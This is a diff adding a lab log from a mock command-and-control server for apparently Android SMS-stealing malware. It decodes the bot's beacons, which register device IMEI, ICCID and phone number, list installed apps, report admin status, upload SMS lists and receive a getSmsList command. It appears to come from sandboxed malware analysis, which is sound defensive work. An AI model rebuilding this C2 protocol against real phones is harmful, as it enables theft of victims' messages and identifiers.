@@ -1,0 +1,55 @@
+[c2] escucha en 192.168.56.20:8060; twitter-id=86d08d31c9d4733; c2=http://192.168.56.20:8060
+[c2] POST /ping Host=192.168.56.20:8060 bytes=9 body=cGluZw==
+
+[c2] 172.22.0.1 "POST /ping HTTP/1.1" 200 -
+[c2] POST /stbi Host=192.168.56.20:8060 bytes=345 body=eyJvcyI6IkFuZHJvaWQgNC40LjIiLCJtb2RlbCI6IlVua25vd24gQW5kcm9pZCBTREsgYnVpbHQg
+Zm9yIHg4NiIsImhhc2giOiJqZmtibDZmbTAybWZrMHJjdXZhMGk0dmdveHllajJ6OHR2bHIwMWpx
+IiwiaW1laSI6IjM1ODI0MDA1MTExMTExMCIsImljY2lkIjoiODkwMTQxMDMyMTExMTg1MTA3MjAi
+LCJjb250cm9sX251bWJlciI6ImRlbGV0ZSBsYXRlciIsIm51bWJlciI6IisxNTU1NTIxNTU1NCIs
+InR5cGUiOiJzdGJpIiwibGFuZyI6ImVuIn0=
+
+[c2] decoded /stbi: {"os":"Android 4.4.2","model":"Unknown Android SDK built for x86","hash":"jfkbl6fm02mfk0rcuva0i4vgoxyej2z8tvlr01jq","imei":"358240051111110","iccid":"89014103211118510720","control_number":"delete later","number":"+15555215554","type":"stbi","lang":"en"}
+[c2] 172.22.0.1 "POST /stbi HTTP/1.1" 200 -
+[c2] POST /sban Host=192.168.56.20:8060 bytes=446 body=eyJ0ZW1wbGF0ZXNfbmFtZXMiOlsiY29tLmFuZHJvaWQuc21va2V0ZXN0IiwiYjRhLmV4YW1wbGYi
+LCJjb20uYW5kcm9pZC53aWRnZXRwcmV2aWV3IiwiY29tLmV4YW1wbGUuYW5kcm9pZC5saXZlY3Vi
+ZXMiLCJjb20uZXhhbXBsZS5hbmRyb2lkLmFwaXMiLCJjb20uYW5kcm9pZC5nZXN0dXJlLmJ1aWxk
+ZXIiLCJjb20uZXhhbXBsZS5hbmRyb2lkLnNvZnRrZXlib2FyZCIsImNvbS5hbmRyb2lkLnNtb2tl
+dGVzdC50ZXN0cyIsImNvbS5rbWMucHJvZCJdLCJ0eXBlIjoic2JhbiIsImxhbmciOiJlbiIsImlt
+ZWkiOiIzNTgyNDAwNTExMTExMTAiLCJib3RfaWQiOiJCT1RfSURfTEFCIn0=
+
+[c2] decoded /sban: {"templates_names":["com.android.smoketest","b4a.examplf","com.android.widgetpreview","com.example.android.livecubes","com.example.android.apis","com.android.gesture.builder","com.example.android.softkeyboard","com.android.smoketest.tests","com.kmc.prod"],"type":"sban","lang":"en","imei":"358240051111110","bot_id":"BOT_ID_LAB"}
+[c2] 172.22.0.1 "POST /sban HTTP/1.1" 200 -
+[c2] POST /gt Host=192.168.56.20:8060 bytes=22 body=SELECTOR_PRINCIPAL_LAB
+[c2] 172.22.0.1 "POST /gt HTTP/1.1" 200 -
+[c2] POST /gt Host=192.168.56.20:8060 bytes=20 body=SELECTOR_TECNICO_LAB
+[c2] 172.22.0.1 "POST /gt HTTP/1.1" 200 -
+[c2] POST /sy Host=192.168.56.20:8060 bytes=106 body=eyJ0eXBlIjoic3kiLCJpc19hZG1pbiI6dHJ1ZSwiaW1laSI6IjM1ODI0MDA1MTExMTExMCIsImJv
+dF9pZCI6IkJPVF9JRF9MQUIifQ==
+
+[c2] decoded /sy: {"type":"sy","is_admin":true,"imei":"358240051111110","bot_id":"BOT_ID_LAB"}
+[c2] 172.22.0.1 "POST /sy HTTP/1.1" 200 -
+[c2] POST /ssl Host=192.168.56.20:8060 bytes=102 body=eyJ0eXBlIjoic3NsIiwiaW1laSI6IjM1ODI0MDA1MTExMTExMCIsImJvdF9pZCI6IkJPVF9JRF9M
+QUIiLCJzbXNfbGlzdCI6W119
+
+[c2] decoded /ssl: {"type":"ssl","imei":"358240051111110","bot_id":"BOT_ID_LAB","sms_list":[]}
+[c2] 172.22.0.1 "POST /ssl HTTP/1.1" 200 -
+[c2] POST /ucs Host=192.168.56.20:8060 bytes=114 body=eyJ0eXBlIjoidWNzIiwiY29tbWFuZCI6ImdldFNtc0xpc3QiLCJpbWVpIjoiMzU4MjQwMDUxMTEx
+MTEwIiwiYm90X2lkIjoiQk9UX0lEX0xBQiJ9
+
+[c2] decoded /ucs: {"type":"ucs","command":"getSmsList","imei":"358240051111110","bot_id":"BOT_ID_LAB"}
+[c2] 172.22.0.1 "POST /ucs HTTP/1.1" 200 -
+[c2] POST /sy Host=192.168.56.20:8060 bytes=106 body=eyJ0eXBlIjoic3kiLCJpc19hZG1pbiI6dHJ1ZSwiaW1laSI6IjM1ODI0MDA1MTExMTExMCIsImJv
+dF9pZCI6IkJPVF9JRF9MQUIifQ==
+
+[c2] decoded /sy: {"type":"sy","is_admin":true,"imei":"358240051111110","bot_id":"BOT_ID_LAB"}
+[c2] 172.22.0.1 "POST /sy HTTP/1.1" 200 -
+[c2] POST /sy Host=192.168.56.20:8060 bytes=106 body=eyJ0eXBlIjoic3kiLCJpc19hZG1pbiI6dHJ1ZSwiaW1laSI6IjM1ODI0MDA1MTExMTExMCIsImJv
+dF9pZCI6IkJPVF9JRF9MQUIifQ==
+
+[c2] decoded /sy: {"type":"sy","is_admin":true,"imei":"358240051111110","bot_id":"BOT_ID_LAB"}
+[c2] 172.22.0.1 "POST /sy HTTP/1.1" 200 -
+[c2] POST /sy Host=192.168.56.20:8060 bytes=106 body=eyJ0eXBlIjoic3kiLCJpc19hZG1pbiI6dHJ1ZSwiaW1laSI6IjM1ODI0MDA1MTExMTExMCIsImJv
+dF9pZCI6IkJPVF9JRF9MQUIifQ==
+
+[c2] decoded /sy: {"type":"sy","is_admin":true,"imei":"358240051111110","bot_id":"BOT_ID_LAB"}
+[c2] 172.22.0.1 "POST /sy HTTP/1.1" 200 -
